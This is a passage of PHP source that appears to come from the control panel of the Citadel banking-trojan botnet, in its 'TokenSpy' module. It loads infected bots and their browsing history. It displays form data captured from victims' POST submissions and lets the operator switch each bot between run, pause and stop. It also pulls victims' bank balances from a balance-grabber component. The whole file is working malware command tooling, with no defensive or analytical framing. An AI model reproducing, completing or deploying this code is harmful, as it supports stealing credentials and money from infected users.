     * @param null $botId
     *      Update the state of this bot only
     */
    function actionAjaxBotsState($botId = null){
        $man = $this->amiss->man;

        # Load the bots
        $_states = array();
        if (!empty($botId)){
            $state = $man->get('\Citadel\Models\TokenSpy\BotState', 'botId = ?', $botId);
            if ($state)
                $_states = array($state);
        } else
            $_states = $man->getList('\Citadel\Models\TokenSpy\BotState', array(
                'where' => '{atime} >= (NOW() - INTERVAL 1 DAY)', # only recent
                'order' => '{atime} DESC',
            ));

        # Keyify, initialize
        /** @var \Citadel\Models\TokenSpy\BotState[] $states */
        $states = array(); # $states[botId] = BotState
        foreach ($_states as $state){
            $states[$state->botId] = $state;
            $state->log = array();
            $state->post = null;
            $state->post_count = 0;
            $state->templateTitle = $state->template[0] == '.'? '-- Custom -- ' : $state->template;
        }

        # Load their logs (partial): $states[botId]->log = BotHistoryLine[]
        $q = $this->db->query( # All log entries, last 24h
            'SELECT `h`.`id`, `h`.`botId`, `h`.`ctime`, `h`.`page`
             FROM `tokenspy_bots_history` `h`
             WHERE `h`.`ctime` >= (NOW() - INTERVAL 1 DAY)
             ORDER BY `h`.`id` ASC
            ;');
        $logs = $this->amiss->loadObjects('\Citadel\Models\TokenSpy\BotHistoryLine', $q);
        foreach ($logs as $log)
            if (isset($states[$log->botId])){
                $states[$log->botId]->log[] = $log;
                unset($log->botId);
            }

        foreach ($states as $state)
            if (count($state->log) > static::LOG_ITEMS_ELLIPSIS){
                $state->log_ellipsis = count($state->log) - static::LOG_ITEMS_ELLIPSIS;
                $state->log = array_slice($state->log, -static::LOG_ITEMS_ELLIPSIS, static::LOG_ITEMS_ELLIPSIS);
            }

        # Load their POSTs: $states[botId]->post = BotPosted
        $q = $this->db->query( # 1 most recent for every bot, last 24h
            'SELECT
                `p`.*,
                `_p`.`post_count`
             FROM `tokenspy_bots_posted` `p`
             CROSS JOIN (
                SELECT MAX(`id`) AS `max_id`, COUNT(`id`) AS `post_count`
                FROM `tokenspy_bots_posted`
                WHERE `ctime` >= (NOW() - INTERVAL 1 DAY)
                GROUP BY `botId`
                ) `_p` ON(`p`.`id` = `_p`.`max_id`)
            ;');
        $posts = $this->amiss->loadObjects('\Citadel\Models\TokenSpy\BotPosted', $q, array('post_count'));
        foreach ($posts as $post)
            if (isset($states[$post->botId]))
                $states[$post->botId]->post = $post;

        # Prepare DateTimes
        foreach ($states as $state){
            $state->ctime = $state->ctime->format('c');
            $state->atime = $state->atime->format('c');
            $state->mtime = $state->mtime->format('c');

            if (!empty($state->log))
                foreach ($state->log as $l)
                    $l->ctime = $l->ctime->format('c');

            if (!empty($state->post))
                $state->post->ctime = $state->post->ctime->format('c');
        }

        # Respond
        header('Content-Type: application/x-json');
        echo json_encode($states, JSON_FORCE_OBJECT); # JSON_FORCE_OBJECT, otherwise, an empty array is []
    }

    /** Change bot's istate
     * @param string $botId
     * @param string $istate
     * @return Models\TokenSpy\BotState
     * @throws Exception
     */
    function actionAjaxSetBotIstate($botId, $istate){
        $this->db->query(
            'UPDATE `tokenspy_bots_state`
             SET `istate`=:istate
             WHERE `botId`=:botId
            ;', array(
            ':botId' => $botId,
            ':istate' => $istate,
        ));
        return true;
    }

    /** PAGE: The Interactive UI
     */
    function actionTs(){
        themeSmall(LNG_MM_BOTNET_TOKENSPY.'-Interactive', '', 0, getBotJsMenu('botmenu'), 0);

        echo <<<'HTML'

<div id="tokenspy-app-loading"></div>

<div id="tokenSpy" --ng-app="TokenSpy" class="hide">
    <img id="one-ring" src="theme/resources/TokenSpy/img/One-Ring-65x60.png" class="pull-left" />

    <div id="ts-header">

        <div id="service-panel" class="btn-group" ng-controller="TsServiceCtrl">
            <a class="btn btn-inverse" href="#" ng-click="openInfowin()" eat-click><i class="icon-th-list icon-white"></i> Infowin</a>
        </div>

    </div>

    <div id="ts-controls" class="pull-right">
        <div id="ts-state" class="btn-group" data-toggle="buttons-radio"  ng-controller="TsStateCtrl">
            <a id="ts-state-on"     ng-click="btClick('on')"    class="btn" ng-class="btCls('on')"      ng-disabled="loading"><i class="icon-play"></i></a>
            <a id="ts-state-pause"  ng-click="btClick('pause')" class="btn" ng-class="btCls('pause')"   ng-disabled="loading"><i class="icon-pause"></i></a>
            <a id="ts-state-off"    ng-click="btClick('off')"   class="btn" ng-class="btCls('off')"     ng-disabled="loading"><i class="icon-stop"></i></a>
        </div>
    </div>

    <table id="ts-bots" class="table table-striped table-bordered table-hover table-condensed"  ng-controller="BotsStateCtrl">
        <THEAD><tr>
            <th>BotID</th>
            <th>URL</th>
            <th>Rule</th>
            <th>Template</th>
            <th>Hits</th>
            <th>Seen</th>
            <th>History</th>
            <th>POST</th>
        </THEAD>
        <TBODY context-menu="cMenu.bot">
            <tr ng-repeat="bot in bots | toArray | orderBy:botsSort:reverse" data-id="{{bot.id}}" data-botid="{{bot.botId}}" class="istate-{{bot.istate}}">
                <th class="botid"><a href="#" ng-click="botActions.botidClick(bot);" eat-event>{{bot.botId}}</a></th>
                <td class="url"><a href="#"  title="Preview" ng-click="botActions.previewPage(bot);" eat-event>{{bot.url}}</a></td>
                <td class="rule">{{bot.rule_name}}</td>
                <td class="template">{{bot.templateTitle}}</td>
                <td class="hits">{{bot.hits}}</td>
                <td class="seen">{{bot.atime |itimeago}}</td>
                <td class="log">
                    <ul>
                        <li class="ellipsis" ng-show="bot.log_ellipsis>0" title="{{bot.log_ellipsis}} more pages"></li>
                        <li
                            ng-repeat="l in bot.log | filter:filterBotLogEmpty"
                            class="page-log page-type-{{l.page.name}}"
                            title="{{l.page.name}}: {{l.page.title}} ({{l.ctime |timeago}})"></li>

                        <li class="page-curr page-type-{{bot.page.name}}"   title="{{bot.page.name}}:  {{bot.page.title}}"  ng-show="bot.page" ><a href="#"></a></li>
                        <li class="page-curr page-set"                      title="Set current page"                        ng-hide="bot.page" ><a href="#"></a></li>

                        <li class="page-next page-type-{{bot.page2.name}}"  title="{{bot.page2.name}}: {{bot.page2.title}}" ng-show="bot.page2"><a href="#"></a></li>
                        <li class="page-next page-set"                      title="Add next page"                           ng-hide="bot.page2"><a href="#"></a></li>
                    </ul>
                </td>
                <td class="post">
                    <a href="#" class="pull-right" ng-show="bot.post.post_count>1">( {{bot.post.post_count}} )</a>
                    <table class="post-data">
                        <tbody>
                            <tr ng-repeat="(k,v) in bot.post.data"><th>{{k}}:</th><td>{{v}}</td></tr>
                        </tbody>
                    </table>
                    <small>{{bot.post.ctime |itimeago}}</small>
                </td>
            </tr>
        </TBODY>
    </table>

    <ul id="ts-hints">
        <li data-hint-for="td.log .page-curr , td.log .page-next">Hold "shift" to get straight to Page Presets picker</li>
    </ul>
</div>
HTML;

        # JS
        echo <<<HTML
        <script type="text/javascript" data-main="theme/js/page-botnet_tokenspy-ts-load.js"  src="theme/js/require/require-min.js"></script>
        <script type="text/javascript" src="theme/js/requirejs-config.js"></script>
HTML;

        ThemeEnd();
    }

    /** PAGE: Bot InfoWindow
     */
    function actionTsInfoWindow(){
        themeSmall(LNG_MM_BOTNET_TOKENSPY.' Infowin', '', 0, getBotJsMenu('botmenu'), 0);

        echo <<<HTML
        <div id="ts-infowin" ng-controller="TsInfowinCtrl" class="ng-cloak">
            <ul id="feed">
                <li ng-repeat="item in feed | reverse" ng-class="item.type">
                    <a class="header" href="?botsaction=fullinfo&bots[]={{item.data.botId}}" target="_blank">{{item.data.botId}}</a>

                    <ng-switch on="item.type">
                        <div ng-switch-when="bot">

                            <dl>
                                <dt>Browser</dt><dd>{{item.data.bs.browser}}</dd>
                                <dt>OS</dt><dd>{{item.data.bot.os_version}}</dd>
                            </dl>

                            <table class="balance lined" ng-show="item.data.balance && item.data.balance.length">
                                <tr ng-repeat="bal in item.data.balance" ng-class="bal.highlight==1 && 'highlight' || ''">
                                    <th>{{bal.dt}}</th>
                                    <td>{{bal.domain}}</td>
                                    <td>{{bal.balance}}&nbsp;{{bal.currency}}</td>
                                </tr>
                            </table>
                        </div>
                    </ng-switch>
                </li>
            </ul>
        </div>
HTML;

        # JS-data
        $data = array();
        echo jsonset(array(
            'window.data' => new stdClass,
            'window.data.tokenspy' => new stdClass,
            'window.data.tokenspy.infowin' => $data,
        ));

        # JS
        echo <<<HTML
        <script type="text/javascript" data-main="theme/js/page-botnet_tokenspy-ts-infowin.js"  src="theme/js/require/require-min.js"></script>
        <script type="text/javascript" src="theme/js/requirejs-config.js"></script>
HTML;

        ThemeEnd();
    }

    /** AJAX: InfoWindow Widget: Bot
     * @param $botId
     */
    function actionAjaxTsInfowindow_Bot($botId){
        // Bot
        $bot = $this->amiss->man->get('Bot', 'bot_id=?', $botId); /** @var Models\Bot $bot */
        if ($bot){
            $bot->os_version = $bot->getOS();
        }

        // BotState
        $bs = $this->amiss->man->get('\\Citadel\\Models\\TokenSpy\\BotState', 'botId=?', $botId); /** @var Models\TokenSpy\BotState $bs */

        // Balance
        $res_balance = array();
        if (file_exists('system/reports_balgrabber.php')){
            // Get the same data that's fed to the widget
            require_once 'system/reports_balgrabber.php';
            $c = new \reports_balgrabberController();
            $res_balance = $c->widget_botinfo_BalanceList($botId, true);
        }

        // Send
        header('Content-Type: application/x-json');
        echo json_encode(array(
            'botId' => $botId,
            'bot' => $bot,
            'bs' => $bs,
            'balance' => $res_balance,
        ));
    }
    #endregion
}
